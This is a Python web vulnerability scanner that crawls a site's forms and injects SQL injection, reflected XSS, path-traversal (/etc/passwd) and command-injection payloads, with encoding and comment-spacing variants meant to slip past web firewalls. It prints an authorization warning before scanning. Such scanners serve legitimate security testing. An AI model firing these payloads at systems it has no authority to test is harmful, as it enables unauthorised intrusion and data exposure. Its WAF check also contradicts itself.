import sys
import json
import time
import queue
import random
import logging
import argparse
import threading
from urllib.parse import urljoin, urlparse, quote
from typing import List, Dict, Set, Any

import requests
from bs4 import BeautifulSoup
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(filename='scanner.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def load_payloads(config_file: str = 'payloads.json') -> Dict[str, Any]:
    try:
        with open(config_file, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        logging.warning("Payload config file not found or corrupted. Using default payloads.")
        return {
            'sql': {
                'error_based': ["' OR 1=1 --", "'", "\"", "' OR '1'='1"],
                'union_based': ["' UNION SELECT 1,2,3 --"],
                'blind_time': ["' AND SLEEP(5) --", "' OR SLEEP(5)--", "'; IF(1=1) WAITFOR DELAY '0:0:5'--"]
            },
            'xss': {
                'reflected': ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "'\"><svg/onload=alert('XSS')>"]
            },
            'file': ["../../../../etc/passwd", "C:\\windows\\win.ini"],
            'command': ["; ls -la", "| dir"]
        }

def generate_bypass_variants(payload: str) -> List[str]:
    variants = {payload}
    variants.add(quote(payload))
    variants.add(quote(quote(payload)))
    variants.add(payload.upper())
    if 'SELECT' in payload.upper():
        variants.add(payload.replace(' ', '/**/'))
    return list(variants)

PAYLOADS = load_payloads()

class WebScanner:
    def __init__(self, url: str, max_depth: int = 2, proxy: str = None, threads: int = 10, timeout: int = 10):
        self.base_url = url
        self.hostname = urlparse(url).netloc
        self.max_depth = max_depth
        self.threads = threads
        self.timeout = timeout
        
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        self.results: List[Dict[str, Any]] = []
        self.visited: Set[str] = set()
        self.lock = threading.Lock()

    def _log_finding(self, vuln_type: str, url: str, payload: str, param: str = "N/A"):
        message = f"{Fore.RED}[!] {vuln_type.upper()} FOUND: {url} | Parameter: {param} | Payload: {payload}"
        print(message)
        with self.lock:
            self.results.append({
                'type': vuln_type,
                'url': url,
                'param': param,
                'payload': payload
            })
            
    def detect_waf(self):
        print(f"{Fore.CYAN}Detecting WAF on {self.hostname}...")
        try:
            resp = self.session.get(self.base_url, params={'q': "<script>alert('waf-test')</script>"}, timeout=self.timeout, verify=False)
            if resp.status_code >= 400 and any(sig in resp.text for sig in ["Cloudflare", "Incapsula", "blocked"]):
                print(f"{Fore.YELLOW}WAF detected. Bypass techniques will be attempted.")
        except requests.RequestException as e:
            logging.error(f"WAF detection error: {e}")
        print(f"{Fore.GREEN}No obvious WAF detected.")

    def crawl(self) -> List[Dict[str, Any]]:
        print(f"{Fore.CYAN}Starting crawl: {self.base_url}")
        q = queue.Queue()
        q.put((self.base_url, 0))
        self.visited.add(self.base_url)
        targets = []

        while not q.empty():
            current_url, depth = q.get()
            if depth > self.max_depth:
                continue

            try:
                resp = self.session.get(current_url, timeout=self.timeout, verify=False)
                soup = BeautifulSoup(resp.content, 'html.parser')

                for form in soup.find_all('form'):
                    inputs = {i.get('name'): i.get('value', '') for i in form.find_all(['input', 'textarea', 'select']) if i.get('name')}
                    if not inputs: continue
                    action = form.get('action', current_url)
                    form_url = urljoin(current_url, action)
                    method = form.get('method', 'get').lower()
                    targets.append({'url': form_url, 'method': method, 'params': inputs})
                
                for link in soup.find_all('a', href=True):
                    full_url = urljoin(current_url, link['href']).split('#')[0]
                    if urlparse(full_url).netloc == self.hostname and full_url not in self.visited:
                        self.visited.add(full_url)
                        q.put((full_url, depth + 1))
            except requests.RequestException as e:
                logging.error(f"Crawl error {current_url}: {e}")
        
        unique_targets = [
            {'url': t[0], 'method': t[1], 'params': dict(t[2])}
            for t in set((d['url'], d['method'], frozenset(d['params'].items())) for d in targets)
        ]
        print(f"{Fore.GREEN}Crawl complete. Found {len(unique_targets)} potential targets (forms).")
        return unique_targets

    def _test_target(self, target: Dict[str, Any], tests_to_run: List[str]):
        if 'sql' in tests_to_run: self._check_sql_injection(target)
        if 'xss' in tests_to_run: self._check_xss(target)
        if 'file' in tests_to_run: self._check_file_inclusion(target)

    def _check_sql_injection(self, target: Dict[str, Any]):
        sql_error_patterns = ["you have an error in your sql syntax", "unclosed quotation mark", "supplied argument is not a valid mysql"]
        payloads = [p for sub in PAYLOADS.get('sql', {}).values() for p in sub]
        self._perform_test(target, payloads, 'sql', sql_error_patterns)

    def _check_xss(self, target: Dict[str, Any]):
        payloads = PAYLOADS.get('xss', {}).get('reflected', [])
        self._perform_test(target, payloads, 'xss')

    def _check_file_inclusion(self, target: Dict[str, Any]):
        payloads = PAYLOADS.get('file', [])
        self._perform_test(target, payloads, 'file', ["root:x:0:0", "[fonts]"])
        
    def _perform_test(self, target: Dict, payloads: List[str], vuln_type: str, success_patterns: List[str] = None):
        for param in list(target['params'].keys()):
            for payload in payloads:
                for variant in generate_bypass_variants(payload):
                    test_params = target['params'].copy()
                    test_params[param] = variant
                    
                    try:
                        start_time = time.time()
                        if target['method'] == 'post':
                            resp = self.session.post(target['url'], data=test_params, timeout=self.timeout, verify=False)
                        else:
                            resp = self.session.get(target['url'], params=test_params, timeout=self.timeout, verify=False)
                        end_time = time.time()
                        
                        vulnerable = False
                        if vuln_type == 'sql' and 'sleep' in variant.lower() and (end_time - start_time) > 4.5:
                            vulnerable = True
                        elif success_patterns and any(pattern in resp.text.lower() for pattern in success_patterns):
                            vulnerable = True
                        elif vuln_type == 'xss' and variant in resp.text:
                            vulnerable = True
                             
                        if vulnerable:
                            vuln_name_map = {'sql': 'SQL Injection', 'xss': 'Reflected XSS', 'file': 'File Inclusion'}
                            self._log_finding(vuln_name_map[vuln_type], target['url'], variant, param)
                            return
                    except requests.RequestException:
                        continue

    def run_scan(self, tests_to_run: List[str]):
        targets = self.crawl()
        if not targets:
            print(f"{Fore.YELLOW}No targets (forms) found. Scan aborted.")
            return

        print(f"\n{Fore.CYAN}Tests to Run: {', '.join(tests_to_run)}")
        print(f"{Fore.CYAN}Starting tests on {len(targets)} targets using {self.threads} threads...")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for target in targets:
                executor.submit(self._test_target, target, tests_to_run)
        
        print(f"\n{Fore.GREEN}All tests completed.")

    def generate_report(self):
        print(f"\n{Fore.CYAN}Generating reports...")
        with open('report.json', 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=4, ensure_ascii=False)

        if not self.results:
            print(f"{Fore.YELLOW}No vulnerabilities found. Advanced reports skipped.")
            print(f"{Fore.GREEN}Empty JSON report (report.json) created.")
            return

        try:
            import pandas as pd
            import matplotlib.pyplot as plt
            df = pd.DataFrame(self.results)
            df.to_html('report.html', index=False, border=1)
            df.to_csv('report.csv', index=False)
            df['type'].value_counts().plot(kind='bar', figsize=(10, 6), title='Vulnerability Distribution').get_figure().savefig('vuln_graph.png')
            print(f"{Fore.GREEN}Reports successfully generated: report.json, report.html, report.csv, vuln_graph.png")
        except ImportError:
            print(f"{Fore.YELLOW}Pandas/matplotlib not installed. Advanced reports skipped.")
            print(f"{Fore.YELLOW}Install with: pip install pandas matplotlib")
        except Exception as e:
            print(f"{Fore.RED}Error generating report: {e}")

def main():
    parser = argparse.ArgumentParser(description="Fast, Driverless Web Vulnerability Scanner")
    parser.add_argument('-u', '--url', required=True, help="Target URL (e.g., http://example.com)")
    parser.add_argument('-t', '--tests', default='sql,xss', help="Comma-separated tests (sql,xss,file)")
    parser.add_argument('--waf', action='store_true', help="Perform basic WAF detection")
    parser.add_argument('--proxy', help="Proxy address (e.g., http://127.0.0.1:8080)")
    parser.add_argument('--depth', type=int, default=2, help="Crawl depth")
    parser.add_argument('--threads', type=int, default=10, help="Number of threads for testing")
    parser.add_argument('--report', action='store_true', help="Generate report after scan")
    args = parser.parse_args()

    print(f"{Fore.YELLOW}WARNING: Use this tool only on systems you are authorized to test.")
    if input("Do you want to continue? (y/n): ").lower() != 'y':
        sys.exit("Operation cancelled by user.")
    
    scanner = WebScanner(url=args.url, max_depth=args.depth, proxy=args.proxy, threads=args.threads)
    if args.waf: scanner.detect_waf()
    
    scanner.run_scan([test.strip() for test in args.tests.split(',')])
    
    if args.report: scanner.generate_report()

if __name__ == "__main__":
    main()
